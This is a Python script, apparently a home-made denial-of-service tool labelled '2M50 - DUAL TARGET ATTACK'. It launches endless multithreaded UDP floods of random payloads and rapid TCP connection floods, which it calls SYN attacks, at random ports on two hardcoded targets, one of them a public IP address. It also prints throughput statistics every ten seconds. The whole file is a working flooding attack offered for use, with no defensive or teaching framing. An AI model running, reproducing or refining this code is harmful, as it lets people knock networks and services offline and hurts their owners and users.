import socket
import threading
import time
import random

# Two target IPs
router_ips = ["62.109.121.42", "192.168.1.1"]  # Add your second IP here

# Colors
MAGENTA = '\033[95m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Stats tracking for each target
stats = {
    ip: {
        "udp_sent": 0,
        "syn_sent": 0,
        "udp_data": 0,
        "syn_data": 0,
        "udp_success": 0,
        "syn_success": 0,
        "udp_fail": 0,
        "syn_fail": 0
    }
    for ip in router_ips
}
stats_lock = threading.Lock()

# UDP Attack for a specific target
def udp_attack(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.randbytes(random.randint(500, 1450))
            port = random.randint(1, 65535)
            
            sock.sendto(payload, (target_ip, port))
            data_sent = len(payload)
            
            with stats_lock:
                stats[target_ip]["udp_sent"] += 1
                stats[target_ip]["udp_data"] += data_sent
                stats[target_ip]["udp_success"] += 1
            sock.close()
            
        except:
            with stats_lock:
                stats[target_ip]["udp_fail"] += 1

# SYN Attack for a specific target
def syn_attack(target_ip):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            port = random.randint(1, 65535)
            
            result = sock.connect_ex((target_ip, port))
            with stats_lock:
                stats[target_ip]["syn_sent"] += 1
                stats[target_ip]["syn_data"] += 64
                if result == 0:
                    stats[target_ip]["syn_success"] += 1
                else:
                    stats[target_ip]["syn_fail"] += 1
            sock.close()
            
        except:
            with stats_lock:
                stats[target_ip]["syn_fail"] += 1

# Start attack threads for each target
def start_attacks():
    # Distribute threads equally between targets
    # 3 UDP threads per target (6 total)
    # 2 SYN threads per target (4 total)
    
    for ip in router_ips:
        # UDP threads
        for _ in range(3):
            threading.Thread(target=udp_attack, args=(ip,), daemon=True).start()
        
        # SYN threads
        for _ in range(2):
            threading.Thread(target=syn_attack, args=(ip,), daemon=True).start()

# Start all attacks
start_attacks()

# Logging every 10s
last_time = time.time()
while True:
    time.sleep(0.1)
    current_time = time.time()
    
    if current_time - last_time >= 10:
        with stats_lock:
            # Calculate totals for each target and combined
            combined_stats = {
                "total_sent": 0,
                "total_data": 0,
                "total_success": 0,
                "total_fail": 0
            }
            
            print(f"\n{MAGENTA}{'='*60}{RESET}")
            print(f"{MAGENTA}2M50 - DUAL TARGET ATTACK{RESET}")
            print(f"{MAGENTA}{'='*60}{RESET}")
            
            for idx, ip in enumerate(router_ips):
                ip_stats = stats[ip]
                ip_sent = ip_stats["udp_sent"] + ip_stats["syn_sent"]
                ip_data = ip_stats["udp_data"] + ip_stats["syn_data"]
                ip_success = ip_stats["udp_success"] + ip_stats["syn_success"]
                ip_fail = ip_stats["udp_fail"] + ip_stats["syn_fail"]
                
                # Add to combined totals
                combined_stats["total_sent"] += ip_sent
                combined_stats["total_data"] += ip_data
                combined_stats["total_success"] += ip_success
                combined_stats["total_fail"] += ip_fail
                
                # Display per-target stats
                color = YELLOW if idx == 0 else CYAN
                data_mb = ip_data / (1024 * 1024)
                pps = ip_sent // 10
                
                print(f"{color}Target {idx+1} ({ip}):{RESET}")
                print(f"  Packets: {GREEN}{ip_sent}{RESET} ({GREEN}{pps} pps{RESET})")
                print(f"  Data: {GREEN}{data_mb:.2f}MB{RESET}")
                print(f"  Status: {GREEN}{ip_success} OK{RESET}, {RED}{ip_fail} FAIL{RESET}")
                print(f"  UDP: {ip_stats['udp_sent']} packets, {ip_stats['udp_data']/1024:.1f}KB")
                print(f"  SYN: {ip_stats['syn_sent']} packets, {ip_stats['syn_data']/1024:.1f}KB")
                print()
                
                # Reset per-IP counters
                stats[ip] = {
                    "udp_sent": 0,
                    "syn_sent": 0,
                    "udp_data": 0,
                    "syn_data": 0,
                    "udp_success": 0,
                    "syn_success": 0,
                    "udp_fail": 0,
                    "syn_fail": 0
                }
            
            # Display combined stats
            combined_data_mb = combined_stats["total_data"] / (1024 * 1024)
            combined_pps = combined_stats["total_sent"] // 10
            
            print(f"{MAGENTA}COMBINED TOTALS:{RESET}")
            print(f"  Total Packets: {GREEN}{combined_stats['total_sent']}{RESET} ({GREEN}{combined_pps} pps{RESET})")
            print(f"  Total Data: {GREEN}{combined_data_mb:.2f}MB{RESET}")
            print(f"  Total Status: {GREEN}{combined_stats['total_success']} OK{RESET}, {RED}{combined_stats['total_fail']} FAIL{RESET}")
            print(f"{MAGENTA}{'='*60}{RESET}")
            
        last_time = current_time
